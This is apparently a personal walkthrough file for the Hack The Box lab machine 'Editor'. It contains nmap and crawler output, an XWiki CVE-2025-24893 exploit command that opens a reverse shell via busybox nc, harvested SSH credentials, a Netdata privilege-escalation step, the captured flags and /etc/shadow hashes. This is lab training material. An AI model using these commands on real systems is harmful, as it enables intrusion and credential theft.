---
file_created: 04 Sep 2025 11:43
title: Editor
difficulty: Easy
difficult_sort: 1
points: 20
os: Linux
target_ip: 10.10.11.80
platform: Hack The Box
category: B2R
box_status: Active
url: https://app.hackthebox.com/machines/Editor
user_flag: true
root_flag: true
completed: false
date_finish: 2025-09-04
tags:
  - htb/machines
---
# Tutorial
- [medium](https://medium.com/@boltech/editor-htb-walkthrough-db899a3d5b68)

---
# Tools Used 



  # Top 1000 scan
```lua
sudo nmap -sC -sV -oA nmap/top1000 -Pn -vv 10.10.11.80                                                  ─╯
[sudo] password for rouxtronics:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 12:28 SAST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:29
Completed Parallel DNS resolution of 1 host. at 12:29, 0.01s elapsed
Initiating SYN Stealth Scan at 12:29
Scanning 10.10.11.80 [1000 ports]
Discovered open port 8080/tcp on 10.10.11.80
Discovered open port 80/tcp on 10.10.11.80
Discovered open port 22/tcp on 10.10.11.80
Completed SYN Stealth Scan at 12:29, 3.62s elapsed (1000 total ports)
Initiating Service scan at 12:29
Scanning 3 services on 10.10.11.80
Completed Service scan at 12:29, 7.05s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.80.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:29
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 13 (13 waiting)
NSE Timing: About 96.93% done; ETC: 12:29 (0:00:00 remaining)
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 13 (13 waiting)
NSE Timing: About 96.93% done; ETC: 12:29 (0:00:00 remaining)
Completed NSE at 12:29, 22.03s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 2.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.02s elapsed
Nmap scan report for 10.10.11.80
Host is up, received user-set (0.51s latency).
Scanned at 2025-09-04 12:29:00 SAST for 35s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan:
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/
|_/xwiki/bin/logout/
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:29
Completed NSE at 12:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.55 seconds
           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.012KB)

```


- [CVE-2024-32019](https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation)

```sh
sshpas -p theEd1t0rTeam99 scp ./CVE-2024-32019-dbs.py oliver@editor.htb:/tmp -p 22
```
# Webpage setup
- Import to `/etc/hosts`
```sh
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```
- Homepage

- Can also access `http://editor.htb:8080/xwiki/bin/view/Main`
- `XWiki Debian 15.10.8` - [CVE-2025-24893](https://nvd.nist.gov/vuln/detail/CVE-2025-24893)
- Repo used [gunzf0x](https://github.com/gunzf0x/CVE-2025-24893) exploit

# [CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893#cve-2025-24893)
Remote Code Execution exploit for [XWiki](https://www.xwiki.org/xwiki/bin/view/Main/WebHome) for versions prior to `15.10.11`, `16.4.1` and `16.5.0RC1`.
```sh
python3 CVE-2025-24893.py -t 'http://editor.htb:8080/xwiki/bin/view/Main' -c 'busybox nc 10.10.14.80 4444 -e /bin/bash'
```
- use netcat 
```sh 
nc -lvnp 4444
```

- To upgrade shell
```bash
SHELL=/bin/bash script -q /dev/null
```
- navigate to `/usr/lib/xwiki/WEB-INF`

>[!info]- Creadit
>user: oliver
>pass: theEd1t0rTeam99

```sh title:sshpass
sshpass -p theEd1t0rTeam99 ssh oliver@10.10.11.80 -p 22
```



# Nmap 
```lua
sudo nmap -sC -sV -sT -oA nmap/web-recon -Pn -vv 10.10.11.80 -p 80,8080                                
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro --Different
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/ --NB
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/
|_/xwiki/bin/logout/
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan:
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-server-header: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.14 seconds

```
# gospider
```sh
gospider -s "http://editor.htb/" -o editor-gospider.txt -c 10 -d 1                                      ─╯

[url] - [code-200] - http://editor.htb/
[href] - http://editor.htb/vite.svg
[href] - http://editor.htb/assets/index-DzxC4GL5.css
[javascript] - http://editor.htb/assets/index-VRKEJlit.js
[url] - [code-200] - http://editor.htb/assets/index-VRKEJlit.js
[subdomains] - http://wiki.editor.htb
[subdomains] - https://wiki.editor.htb
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - https://reactjs.org/docs/error-decoder.html?invariant=
[linkfinder] - https://reactjs.org/docs/error-decoder.html?invariant=
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - http://www.w3.org/1999/xlink
[linkfinder] - http://www.w3.org/1999/xlink
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - http://www.w3.org/XML/1998/namespace
[linkfinder] - http://www.w3.org/XML/1998/namespace
[linkfinder] - http://www.w3.org/XML/1998/namespace
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - http://www.w3.org/2000/svg
[linkfinder] - http://www.w3.org/2000/svg
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - http://www.w3.org/1998/Math/MathML
[linkfinder] - http://www.w3.org/1998/Math/MathML
[linkfinder] - http://www.w3.org/1998/Math/MathML
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - http://www.w3.org/1999/xhtml
[linkfinder] - http://www.w3.org/1999/xhtml
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - http://wiki.editor.htb/xwiki/
[linkfinder] - http://wiki.editor.htb/xwiki/
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - /about
[linkfinder] - http://editor.htb/about
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - /assets/simplistcode_1.0.deb
[linkfinder] - http://editor.htb/assets/simplistcode_1.0.deb
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - /assets/simplistcode_1.0.exe
[linkfinder] - http://editor.htb/assets/simplistcode_1.0.exe
[linkfinder] - [from: http://editor.htb/assets/index-VRKEJlit.js] - config.json
[linkfinder] - http://editor.htb/assets/config.json
[linkfinder] - http://editor.htb/config.json

```
# Feroxbuster 
# Burpsuite 
---
# Trophies
## User Flag
```txt
bbb7415c97af15ecef58323230d39255
```
## Root Flag 
```txt
3b69ed39f9568c80254d5c0c8bfcbcd3
```
## /etc/shadow
```bash
cat /etc/shadow
```

```txt
root:$y$j9T$l1.MaTIpHzTAduIC4EoaA/$rNvK9Vq.iBxZ3BXRP4SM2CtSkVYdVnr5XrWQvMzLx99:20258:0:99999:7:::
oliver:$y$j9T$ktpLdRnocjXX8B2lat/6g.$/RNnDVRsMc0KybbsLVuJhxX9FgtjNMmPqvdYRaHOqu/:20258:0:99999:7:::
```
---
# Proof
![](<./attachments/Editor-pwned.png>)